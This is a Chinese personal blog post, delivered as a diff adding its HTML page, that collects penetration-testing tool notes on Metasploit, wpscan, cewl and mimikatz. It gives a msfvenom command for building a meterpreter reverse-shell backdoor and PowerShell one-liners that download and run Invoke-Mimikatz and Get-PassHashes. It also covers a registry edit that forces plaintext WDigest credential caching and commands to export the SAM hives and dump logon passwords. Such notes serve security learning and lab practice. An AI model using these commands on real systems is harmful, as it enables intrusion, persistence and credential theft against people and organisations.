@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-32*32.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/cat-32*32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/cat-16*16.ico">
+  <link rel="mask-icon" href="/images/cat-32*32.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lycshub.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="metaspolit默认使用msfconsole进入这个交互式命令行工具， 然后主要是有几种模式  直接利用payload 12345678910# 搜索漏洞payloadmsf6 &gt; search [key_word]# 选中payloadmsf6 &gt; use [上一步搜出来的payload name]# 设置payload参数,key忽略大小写msf6 &gt; set key">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试工具整理">
+<meta property="og:url" content="https://lycshub.github.io/2021/11/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/index.html">
+<meta property="og:site_name" content="Lyc&#39;s Blog">
+<meta property="og:description" content="metaspolit默认使用msfconsole进入这个交互式命令行工具， 然后主要是有几种模式  直接利用payload 12345678910# 搜索漏洞payloadmsf6 &gt; search [key_word]# 选中payloadmsf6 &gt; use [上一步搜出来的payload name]# 设置payload参数,key忽略大小写msf6 &gt; set key">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-26T03:55:24.000Z">
+<meta property="article:modified_time" content="2021-11-26T05:40:41.654Z">
+<meta property="article:author" content="Harry Smith">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://lycshub.github.io/2021/11/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>渗透测试工具整理 | Lyc's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-212139889-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-212139889-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lyc's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://lycshub.github.io/2021/11/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://gitee.com/tjdx1817054/typora/raw/master/natumetakasi-2021-11-318:56:10.jpg">
+      <meta itemprop="name" content="Harry Smith">
+      <meta itemprop="description" content="取次花丛懒回顾，半缘修道半缘君">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lyc's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透测试工具整理
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-11-26 11:55:24 / Modified: 13:40:41" itemprop="dateCreated datePublished" datetime="2021-11-26T11:55:24+08:00">2021-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2021/11/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/11/26/渗透测试工具整理/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <span id="more"></span>
+
+<h2 id="metaspolit"><a href="#metaspolit" class="headerlink" title="metaspolit"></a>metaspolit</h2><p>默认使用<code>msfconsole</code>进入这个交互式命令行工具，</p>
+<p>然后主要是有几种模式</p>
+<ol>
+<li><p>直接利用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 搜索漏洞payload</span><br><span class="line">msf6 &gt; search [key_word]</span><br><span class="line"># 选中payload</span><br><span class="line">msf6 &gt; use [上一步搜出来的payload name]</span><br><span class="line"># 设置payload参数,key忽略大小写</span><br><span class="line">msf6 &gt; set key value</span><br><span class="line">#　显示payload参数</span><br><span class="line">msf6 &gt; options</span><br><span class="line"># 运行payload</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>注意这个依旧是msfconsole模式就是交互式命令行模式</p>
+</li>
+<li><p>利用指定的payload监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt;　use exploit/multi/handler        # 加载模块</span><br><span class="line">msf6 &gt; set [payload_name]   # 设置名字</span><br><span class="line">msf6 &gt; set [options_key]  [options_value]   # 设置该payload的options键值</span><br><span class="line"># 开始监听</span><br><span class="line">msf6 &gt; run</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>上面两个如果run完成了之后执行<code>shell</code>命令就进入了meterperter即已经进入了系统内部shell环境，所以个人理解这个meterperter是准备持久化</strong></p>
+<ol start="3">
+<li><p>使用msf生成后门</p>
+<p>这是另一个模块<strong>msfvenom</strong>的内容</p>
+<p>example:</p>
+<ul>
+<li>生成二进制文件</li>
+</ul>
+</li>
+</ol>
+<p>​        <code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.100.103 LPORT=4444 -f raw &gt; beacon.bin</code></p>
+<ul>
+<li>生成其他类型只需要改-f的属性就行</li>
+</ul>
+<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a><a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">wpscan</a></h2><blockquote>
+<p>此工具主要用来扫描worldpress这个博客框架，这个应该更加靠近web渗透那一侧，就先放在这里做工具整理</p>
+<p>world press scan</p>
+</blockquote>
+<p>它使用R的包管理构建，或者使用docker，kali自带。</p>
+<p>我的系统是ubuntu所以采用了前者构建，详见之前打这个靶场的时候<a href="https://lycshub.github.io/2021/11/23/vulnhub-DC-2/">记录</a></p>
+<p>参数和用法很简单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">＃使用默认配置扫网站</span><br><span class="line">wpscan --url　[目标网站]</span><br><span class="line"># 使用--stealthy可以静默扫描防止网站发现</span><br><span class="line">--enumertate可以爆破用户名使用它的时候加上--plugins-detection检测插件选项，默认是不检查</span><br><span class="line">-u 是枚举用户名</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><p>这是一个字典生成器<code>-h</code>可以看到所有的选项</p>
+<p>记录下常用选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#默认方法直接吧生成的字典</span><br><span class="line">cewl url</span><br><span class="line"># -w生成到指定文件</span><br><span class="line">cewl url -w dict.txt</span><br><span class="line"># 计算重复的单词次数</span><br><span class="line">cewl url -c</span><br><span class="line"># -d 爬取深度3层</span><br><span class="line">cewl url -d 3</span><br><span class="line"># -e获取email信息</span><br><span class="line"># --with-numbers包括数字和字符</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h2><blockquote>
+<p>这个工具是我新接触的，记录一下使用的姿势</p>
+<p>主要就是一个后渗透的工具，针对拿到了shell但是没有更高的权限时</p>
+<p>针对windows系统</p>
+<p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从  lsass.exe 进程中获取当前登录系统用户名的密码，  lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在  lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz  正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p>
+<p>注：但是在安装了KB2871997补丁或者系统版本大于windows server  2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p>
+</blockquote>
+<h3 id="使用powershell获取密码"><a href="#使用powershell获取密码" class="headerlink" title="使用powershell获取密码"></a>使用powershell获取密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取密码明文(需要管理员权限)</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>); <span class="built_in">Invoke-Mimikatz</span> –DumpCerts</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取密码hash值(需要管理员权限)</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;</span>);<span class="built_in">Get-PassHashes</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h4><p>下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"><span class="comment">#抓取密码</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
+<p>cmd修改注册表命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyreg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"><span class="comment">#重启或用户重新登录后可以成功抓取</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="SAM表获取hash"><a href="#SAM表获取hash" class="headerlink" title="SAM表获取hash"></a>SAM表获取hash</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导出SAM数据</span></span><br><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用mimikatz提取hash</span></span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
+
+
+
+<p>还有和很多姿势，因为对windows很多安全机制不了解（比如域控中的成员hash,哈系传递攻击，票据传递攻击包括这个工具本身的免杀）先挖个坑，之后补全</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/25/java%E6%8F%92%E6%A1%A9-javaagent/" rel="prev" title="java插桩(javaagent)">
+      <i class="fa fa-chevron-left"></i> java插桩(javaagent)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/12/18/linux%E4%BD%BF%E7%94%A8rdp%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5windows/" rel="next" title="linux使用rdp远程连接windows">
+      linux使用rdp远程连接windows <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#metaspolit"><span class="nav-number">1.</span> <span class="nav-text">metaspolit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wpscan"><span class="nav-number">2.</span> <span class="nav-text">wpscan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cewl"><span class="nav-number">3.</span> <span class="nav-text">cewl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz"><span class="nav-number">4.</span> <span class="nav-text">mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8powershell%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">4.1.</span> <span class="nav-text">使用powershell获取密码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%89%A7%E8%A1%8C"><span class="nav-number">4.1.1.</span> <span class="nav-text">本地执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SAM%E8%A1%A8%E8%8E%B7%E5%8F%96hash"><span class="nav-number">4.1.2.</span> <span class="nav-text">SAM表获取hash</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Harry Smith"
+      src="https://gitee.com/tjdx1817054/typora/raw/master/natumetakasi-2021-11-318:56:10.jpg">
+  <p class="site-author-name" itemprop="name">Harry Smith</p>
+  <div class="site-description" itemprop="description">取次花丛懒回顾，半缘修道半缘君</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Harry Smith</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://harrysmith-1.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://lycshub.github.io/2021/11/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/";
+    this.page.identifier = "2021/11/26/渗透测试工具整理/";
+    this.page.title = "渗透测试工具整理";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://harrysmith-1.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
